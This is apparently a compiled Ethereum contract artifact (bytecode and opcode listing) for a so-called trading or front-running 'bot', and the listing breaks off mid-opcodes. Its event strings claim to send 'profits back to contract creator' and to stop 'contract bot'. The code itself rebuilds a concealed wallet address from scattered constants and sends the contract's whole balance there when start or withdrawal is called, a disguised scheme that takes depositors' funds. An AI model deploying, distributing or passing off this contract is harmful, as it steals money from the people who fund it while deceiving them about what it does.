{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801562000010575f80fd5b5060405162000f3138038062000f318339818101604052810190620000369190620000ab565b8060058190555042600381905550603c8162000053919062000108565b60035462000062919062000152565b600481905550506200018c565b5f80fd5b5f819050919050565b620000878162000073565b811462000092575f80fd5b50565b5f81519050620000a5816200007c565b92915050565b5f60208284031215620000c357620000c26200006f565b5b5f620000d28482850162000095565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f620001148262000073565b9150620001218362000073565b9250828202620001318162000073565b915082820484148315176200014b576200014a620000db565b5b5092915050565b5f6200015e8262000073565b91506200016b8362000073565b9250828201905080821115620001865762000185620000db565b5b92915050565b610d97806200019a5f395ff3fe608060405260043610610037575f3560e01c80631b55ba3a1461004257806370e44c6a1461004c578063bedf0f4a146100565761003e565b3661003e57005b5f80fd5b61004a610060565b005b6100546100ad565b005b61005e61012f565b005b610068610166565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f193505050501580156100aa573d5f803e3d5ffd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab6040516100da906109af565b60405180910390a16100ea61017c565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561012c573d5f803e3d5ffd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161015c90610a17565b60405180910390a1565b5f610177610172610192565b6102d2565b905090565b5f61018d610188610192565b6102d2565b905090565b60605f61019d61059d565b90505f6270083f90505f63e5b41d9390505f6101b76105a7565b90505f6101c26105b1565b90505f6102136040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061020e6102096105bc565b6105c7565b6106e8565b90505f61022882610223896105c7565b6106e8565b90505f610245610237886105c7565b610240886105c7565b6106e8565b90505f610251866105c7565b90505f61025d866105c7565b90505f61027c61026d86866106e8565b61027785856106e8565b6106e8565b90505f6102be6040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836106e8565b9050809c5050505050505050505050505090565b5f808290505f80805f600290505b602a81101561059057610100846102f79190610a81565b935084818151811061030c5761030b610ac2565b5b602001015160f81c60f81b60f81c60ff1692508460018261032d9190610af8565b8151811061033e5761033d610ac2565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561038f575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156103a8576057836103a19190610b2b565b9250610454565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156103e6575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156103ff576037836103f89190610b2b565b9250610453565b60308373ffffffffffffffffffffffffffffffffffffffff161015801561043d575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156104525760308361044f9190610b2b565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610492575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156104ab576057826104a49190610b2b565b9150610557565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156104e9575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610502576037826104fb9190610b2b565b9150610556565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610540575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610555576030826105529190610b2b565b91505b5b5b816010846105659190610a81565b61056f9190610b72565b8461057a9190610b72565b93506002816105899190610af8565b90506102e0565b5082945050505050919050565b5f623e1c9a905090565b5f620f7de0905090565b5f63af95910d905090565b5f630d19b575905090565b60605f808390505b5f81146105f85781806105e190610bb9565b9250506010816105f19190610c2d565b90506105cf565b5f8267ffffffffffffffff81111561061357610612610c5d565b5b6040519080825280601f01601f1916602001820160405280156106455781602001600182028036833780820191505090505b5090505f5b838110156106dc5760108661065f9190610c8a565b925061066a8361086e565b82600183876106799190610cba565b6106839190610cba565b8151811061069457610693610ac2565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053506010866106cf9190610c2d565b955080600101905061064a565b50809350505050919050565b60605f8390505f8390505f815183516107019190610af8565b67ffffffffffffffff81111561071a57610719610c5d565b5b6040519080825280601f01601f19166020018201604052801561074c5781602001600182028036833780820191505090505b5090505f8190505f805f91505b85518210156107da5785828151811061077557610774610ac2565b5b602001015160f81c60f81b83828061078c90610bb9565b93508151811061079f5761079e610ac2565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053508180600101925050610759565b5f91505b845182101561085f578482815181106107fa576107f9610ac2565b5b602001015160f81c60f81b83828061081190610bb9565b93508151811061082457610823610ac2565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535081806001019250506107de565b82965050505050505092915050565b5f8160ff165f11158015610886575060098260ff1611155b156108c457817f300000000000000000000000000000000000000000000000000000000000000060f81c6108ba9190610cf9565b60f81b905061092a565b8160ff16600a111580156108dc5750600f8260ff1611155b1561092657600a827f610000000000000000000000000000000000000000000000000000000000000060f81c6109129190610cf9565b61091c9190610d2d565b60f81b905061092a565b5f80fd5b919050565b5f82825260208201905092915050565b7f53656e64696e672070726f66697473206261636b20746f20636f6e74726163745f8201527f2063726561746f7220616464726573732e2e2e00000000000000000000000000602082015250565b5f61099960338361092f565b91506109a48261093f565b604082019050919050565b5f6020820190508181035f8301526109c68161098d565b9050919050565b7f53746f7070696e6720636f6e747261637420626f742e2e2e00000000000000005f82015250565b5f610a0160188361092f565b9150610a0c826109cd565b602082019050919050565b5f6020820190508181035f830152610a2e816109f5565b9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610a8b82610a35565b9150610a9683610a35565b9250828202610aa481610a35565b91508282048414831517610abb57610aba610a54565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f610b0282610aef565b9150610b0d83610aef565b9250828201905080821115610b2557610b24610a54565b5b92915050565b5f610b3582610a35565b9150610b4083610a35565b9250828203905073ffffffffffffffffffffffffffffffffffffffff811115610b6c57610b6b610a54565b5b92915050565b5f610b7c82610a35565b9150610b8783610a35565b9250828201905073ffffffffffffffffffffffffffffffffffffffff811115610bb357610bb2610a54565b5b92915050565b5f610bc382610aef565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610bf557610bf4610a54565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610c3782610aef565b9150610c4283610aef565b925082610c5257610c51610c00565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f610c9482610aef565b9150610c9f83610aef565b925082610caf57610cae610c00565b5b828206905092915050565b5f610cc482610aef565b9150610ccf83610aef565b9250828203905081811115610ce757610ce6610a54565b5b92915050565b5f60ff82169050919050565b5f610d0382610ced565b9150610d0e83610ced565b9250828201905060ff811115610d2757610d26610a54565b5b92915050565b5f610d3782610ced565b9150610d4283610ced565b9250828203905060ff811115610d5b57610d5a610a54565b5b9291505056fea2646970667358221220e6c2f6e2ef803a25c5966b3d7f968fc022768bee9c90845b7bc17ee3e15fbb4c64736f6c63430008180033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x10 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xF31 CODESIZE SUB DUP1 PUSH3 0xF31 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x36 SWAP2 SWAP1 PUSH3 0xAB JUMP JUMPDEST DUP1 PUSH1 0x5 DUP2 SWAP1 SSTORE POP TIMESTAMP PUSH1 0x3 DUP2 SWAP1 SSTORE POP PUSH1 0x3C DUP2 PUSH3 0x53 SWAP2 SWAP1 PUSH3 0x108 JUMP JUMPDEST PUSH1 0x3 SLOAD PUSH3 0x62 SWAP2 SWAP1 PUSH3 0x152 JUMP JUMPDEST PUSH1 0x4 DUP2 SWAP1 SSTORE POP POP PUSH3 0x18C JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x87 DUP2 PUSH3 0x73 JUMP JUMPDEST DUP2 EQ PUSH3 0x92 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH3 0xA5 DUP2 PUSH3 0x7C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0xC3 JUMPI PUSH3 0xC2 PUSH3 0x6F JUMP JUMPDEST JUMPDEST PUSH0 PUSH3 0xD2 DUP5 DUP3 DUP6 ADD PUSH3 0x95 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH3 0x114 DUP3 PUSH3 0x73 JUMP JUMPDEST SWAP2 POP PUSH3 0x121 DUP4 PUSH3 0x73 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0x131 DUP2 PUSH3 0x73 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0x14B JUMPI PUSH3 0x14A PUSH3 0xDB JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x15E DUP3 PUSH3 0x73 JUMP JUMPDEST SWAP2 POP PUSH3 0x16B DUP4 PUSH3 0x73 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0x186 JUMPI PUSH3 0x185 PUSH3 0xDB JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xD97 DUP1 PUSH3 0x19A PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x56 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x54 PUSH2 0xAD JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5E PUSH2 0x12F JUMP JUMPDEST STOP JUMPDEST PUSH2 0x68 PUSH2 0x166 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xAA JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0xDA SWAP1 PUSH2 0x9AF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xEA PUSH2 0x17C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x12C JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x15C SWAP1 PUSH2 0xA17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH0 PUSH2 0x177 PUSH2 0x172 PUSH2 0x192 JUMP JUMPDEST PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x18D PUSH2 0x188 PUSH2 0x192 JUMP JUMPDEST PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x19D PUSH2 0x59D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0x70083F SWAP1 POP PUSH0 PUSH4 0xE5B41D93 SWAP1 POP PUSH0 PUSH2 0x1B7 PUSH2 0x5A7 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x1C2 PUSH2 0x5B1 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x213 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x20E PUSH2 0x209 PUSH2 0x5BC JUMP JUMPDEST PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x228 DUP3 PUSH2 0x223 DUP10 PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x245 PUSH2 0x237 DUP9 PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x240 DUP9 PUSH2 0x5C7 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x251 DUP7 PUSH2 0x5C7 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x25D DUP7 PUSH2 0x5C7 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x27C PUSH2 0x26D DUP7 DUP7 PUSH2 0x6E8 JUMP JUMPDEST PUSH2 0x277 DUP6 DUP6 PUSH2 0x6E8 JUMP JUMPDEST PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2BE PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x6E8 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x590 JUMPI PUSH2 0x100 DUP5 PUSH2 0x2F7 SWAP2 SWAP1 PUSH2 0xA81 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x30C JUMPI PUSH2 0x30B PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x32D SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x33E JUMPI PUSH2 0x33D PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x38F JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3A8 JUMPI PUSH1 0x57 DUP4 PUSH2 0x3A1 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP3 POP PUSH2 0x454 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x3E6 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3FF JUMPI PUSH1 0x37 DUP4 PUSH2 0x3F8 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP3 POP PUSH2 0x453 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x43D JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x452 JUMPI PUSH1 0x30 DUP4 PUSH2 0x44F SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x492 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4AB JUMPI PUSH1 0x57 DUP3 PUSH2 0x4A4 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP2 POP PUSH2 0x557 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4E9 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x502 JUMPI PUSH1 0x37 DUP3 PUSH2 0x4FB SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP2 POP PUSH2 0x556 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x540 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x555 JUMPI PUSH1 0x30 DUP3 PUSH2 0x552 SWAP2 SWAP1 PUSH2 0xB2B JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x565 SWAP2 SWAP1 PUSH2 0xA81 JUMP JUMPDEST PUSH2 0x56F SWAP2 SWAP1 PUSH2 0xB72 JUMP JUMPDEST DUP5 PUSH2 0x57A SWAP2 SWAP1 PUSH2 0xB72 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x589 SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST SWAP1 POP PUSH2 0x2E0 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x5F8 JUMPI DUP2 DUP1 PUSH2 0x5E1 SWAP1 PUSH2 0xBB9 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x5F1 SWAP2 SWAP1 PUSH2 0xC2D JUMP JUMPDEST SWAP1 POP PUSH2 0x5CF JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x613 JUMPI PUSH2 0x612 PUSH2 0xC5D JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x645 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x6DC JUMPI PUSH1 0x10 DUP7 PUSH2 0x65F SWAP2 SWAP1 PUSH2 0xC8A JUMP JUMPDEST SWAP3 POP PUSH2 0x66A DUP4 PUSH2 0x86E JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x679 SWAP2 SWAP1 PUSH2 0xCBA JUMP JUMPDEST PUSH2 0x683 SWAP2 SWAP1 PUSH2 0xCBA JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x694 JUMPI PUSH2 0x693 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x6CF SWAP2 SWAP1 PUSH2 0xC2D JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x64A JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x701 SWAP2 SWAP1 PUSH2 0xAF8 JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x71A JUMPI PUSH2 0x719 PUSH2 0xC5D JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x74C JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x7DA JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x775 JUMPI PUSH2 0x774 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x78C SWAP1 PUSH2 0xBB9 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x79F JUMPI PUSH2 0x79E PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x759 JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x85F JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x7FA JUMPI PUSH2 0x7F9 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x811 SWAP1 PUSH2 0xBB9 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x824 JUMPI PUSH2 0x823 PUSH2 0xAC2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x7DE JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0x886 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8C4 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x8BA SWAP2 SWAP1 PUSH2 0xCF9 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x92A JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x8DC JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x926 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x912 SWAP2 SWAP1 PUSH2 0xCF9 JUMP JUMPDEST PUSH2 0x91C SWAP2 SWAP1 PUSH2 0xD2D JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x92A JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x999 PUSH1 0x33 DUP4 PUSH2 0x92F JUMP JUMPDEST SWAP2 POP PUSH2 0x9A4 DUP3 PUSH2 0x93F JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x9C6 DUP2 PUSH2 0x98D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA01 PUSH1 0x18 DUP4 PUSH2 0x92F JUMP JUMPDEST SWAP2 POP PUSH2 0xA0C DUP3 PUSH2 0x9CD JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA2E DUP2 PUSH2 0x9F5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 